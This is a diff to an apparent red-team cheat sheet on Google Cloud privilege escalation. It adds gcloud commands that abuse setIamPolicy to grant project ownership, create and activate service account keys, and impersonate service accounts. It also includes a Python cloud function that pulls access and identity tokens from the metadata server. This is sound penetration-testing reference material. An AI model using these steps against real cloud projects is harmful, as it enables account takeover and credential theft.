@@ -57,13 +57,13 @@ gcloud projects get-iam-policy <PROJECT ID> --flatten="bindings[].members" --fil
 #### Oneliner to check permissions of a user on all projects
 ```
 GCUSER=<USER EMAIL>
-gcloud projects list | awk '{print $1}' | tail -n +2  | while read project; do echo "\n [+] checking: $project\n" && gcloud projects get-iam-policy $project --flatten="bindings[].members" --filter="bindings.members=user:$GCUSER" --format="value(bindings.role)"; done
+gcloud projects list --format="value(PROJECT_NUMBER)" | while read project; do echo "\n [+] checking: $project\n" && gcloud projects get-iam-policy $project --flatten="bindings[].members" --filter="bindings.members=user:$GCUSER" --format="value(bindings.role)"; done
 ```
 
 #### Oneliner to check permissions of a user on all service accounts
 ```
 GCUSER=<USER EMAIL>
-gcloud iam service-accounts list | rev | awk '{print $2}' | rev | tail -n +2 | while read serviceaccount; do echo "\n [+] checking: $serviceaccount\n" && gcloud iam service-accounts get-iam-policy $serviceaccount --flatten="bindings[].members" --filter="bindings.members=user:$GCUSER" --format="value(bindings.role)" 2>/dev/null; done
+gcloud iam service-accounts list --format="value(email)" | while read serviceaccount; do echo "\n [+] checking: $serviceaccount\n" && gcloud iam service-accounts get-iam-policy $serviceaccount --flatten="bindings[].members" --filter="bindings.members=user:$GCUSER" --format="value(bindings.role)" 2>/dev/null; done
 ```
 
 #### List all permission in custom role
@@ -101,6 +101,8 @@ gcloud container clusters list --impersonate-service-account $serviceaccount
 ```
 
 ## IAM Policy Permissions
+- List of roles and permissions: https://cloud.google.com/iam/docs/understanding-roles#cloud-security-scanner-roles
+
 ### Set IAM policy permission
 - User or Service account can set IAM policy on Org / Folder / Project or individual resource level
 - Roles: `roles/resourcemanager.organizationAdmin`, `roles/owner`, `roles/[resource-admin]`
@@ -120,17 +122,53 @@ gcloud projects add-iam-policy-binding <PROJECT ID> --member='user:<USER EMAIL>'
 gcloud projects add-iam-policy-binding <PROJECT ID> --member='serviceAccount:<USER EMAIL>' --role='roles/editor'
 ```
 
+#### Retrieve the permissions of project for user
+```
+gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)"
+```
+
 ### Custom role permission update
 - Custom role contain user defined permission, can only be attached to organization or project level
 - Roles: `roles/iam.organizationRoleAdmin`, `roles/iam.roleAdmin`
 - Permissions: `iam.roles.update`
 
 #### Set IAM policy on project level
+- Add the permission `resourcemanager.projects.setIamPolicy`
 ```
 gcloud iam roles update <ROLE NAME> --project=<PROJECT ID> --add-permissions=resourcemanager.projects.setIamPolicy
 ```
 
+#### Get role permission
+```
+gcloud iam roles describe <ROLE NAME> --project=<PROJECT ID>
+```
+
+#### Making a user owner of the project
+- Abusing the `resourcemanager.projects.setIamPolicy` permissions.
+```
+gcloud projects add-iam-policy-binding <PROJECT ID> --member='user:<USER EMAIL>' --role='roles/owner'
+```
+
+#### Retrieve the permissions of project for user
+```
+gcloud projects get-iam-policy alert-nimbus-335411 --flatten="bindings[].members" --filter="bindings.members=user:<USER EMAIL>" --format="value(bindings.role)"
+```
+
 ## Service Account
+- Three types of service accounts:
+  - Default Service Account
+    - They automatically created within a project. when a user create any compute workload. 
+    - Format:
+      - App engine default service account: `project-id@appspot.gserviceaccount.com`
+      - Compute engine default service account: `project-number-compute@developer.gserviceaccount.com`
+  - User Managed Service Account
+    - Created and managed by end user when required. 
+      - Format: `service-account-name@project-id.iam.gserviceaccount.com`
+  - Google Managed Service Account
+    - Used by gcp services when they need access to user resources on their behalf. 
+    - Google API Service Agent format: `project-number@cloudservices.gserviceaccount.com`
+- After compromising a service account check what type of service account it is. This might give a hint for what service the account is and what resource to abuse!
+
 ### Service Account Key Admin
 - Key admin can create a new key for service account. Max 10 keys per service account.
 - Roles: `roles/iam.serviceAccountAdmin`, `roles/iam.serviceAccountKeyAdmin`
@@ -142,8 +180,14 @@ gcloud iam service-accounts keys list --iam-account <SERVICE ACCOUNT ID>
 ```
 
 #### Create a new key for specified service account.
+- Saves credentials in `key.json`
 ```
 gcloud iam service-accounts keys create key.json --iam-account <SERVICE ACCOUNT ID>
+```
+
+#### Authenticate with key file
+```
+gcloud auth activate-service-account --key-file key.json
 ```
 
 ### Service Account Impersonation
@@ -155,7 +199,7 @@ gcloud iam service-accounts keys create key.json --iam-account <SERVICE ACCOUNT 
 
 #### Create short-lived access token
 ```
-gcloud auth print-access-token --impersonate-service-account <Impersonate Service Account Email>
+gcloud auth print-access-token --impersonate-service-account <SERVICE ACCOUNT EMAIL>
 ```
 
 #### Verify short-lived access token
@@ -165,29 +209,64 @@ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=<ACCESS TOKEN>
 
 #### Create short-lived identity token
 ```
-gcloud auth print-identity-token --impersonate-service-account <Impersonate Service Account Email>
+gcloud auth print-identity-token --impersonate-service-account <SERVICE ACCOUNT EMAIL>
 ```
 
 #### Verify short-lived identity token
 ```
-curl https://www.googleapis.com/oauth2/v1/tokeninfo?identity_token=<IDENTITY TOKEN>
+curl https://www.googleapis.com/oauth2/v1/tokeninfo?id_token=<IDENTITY TOKEN>
 ```
+
+#### Use token
+- Save access token the file. Use the `--access-token-file=` with gcloud CLI to use the service account.
+- Use the [google API](/cloud/gc/authenticated-enumeration.md#Enumeration-using-Google-Cloud-API)
 
 ### Service Account User
 - Allows principals to indirectly access all the resources that the service account can acces.
-- Principal can attach service account to any compute resource and access it’s permissions.
+- Principal can attach service account to any compute resource and access it’s permissions by taking it over.
 - Roles: `roles/iam.serviceAccountUser`
-- Permissions: `iam.serviceAccounts.actAs`
+- Permissions: `iam.serviceAccounts.actAs` & Enough permissions on a compute instance
+- Possible to abuse if you can update/create a compute instance. Attach the service account and then take it over.
+- Example is with `roles/cloudfunctions.admin` with cloud function!
+
+#### Cloud function
+- Python code to retrieve access token
+```
+import subprocess
+import random
+import io
+import string
+import json
+import os
+from urllib.request import Request, urlopen
+from base64 import b64decode, b64encode
+
+def hello_world(request):
+    request_json = request.get_json()
+    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
+    req.add_header('Metadata-Flavor', 'Google')
+    content = urlopen(req).read()
+    token = json.loads(content)
+    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com')
+    req.add_header('Metadata-Flavor', 'Google')
+    content = urlopen(req).read()
+    token["identity"] = content.decode("utf-8")
+    return json.dumps(token)
+```
 
 #### Create cloud function with attached service account
 ```
-gcloud functions deploy [my-fun] --timeout 539 --trigger-http --source [function-source] --runtime python37 --entry-point hello_world  --service-account [service-account-email]
+gcloud functions deploy <FUNCTION NAME> --timeout 539 --trigger-http --source <FUNCTION SOURCE DIRECTORY> --runtime python37 --entry-point hello_world --service-account <SERVICE ACCOUNT>
 ```
 
 #### Invoke cloud function and retrieve temporary credential
 ```
 gcloud functions call function-name --data '{}'
 ```
+
+#### Use token
+- Save access token the file. Use the `--access-token-file=` with gcloud CLI to use the service account.
+- Use the [google API](/cloud/gc/authenticated-enumeration.md#Enumeration-using-Google-Cloud-API)
 
 ## Cloud Functions
 #### List all cloud functions on project level
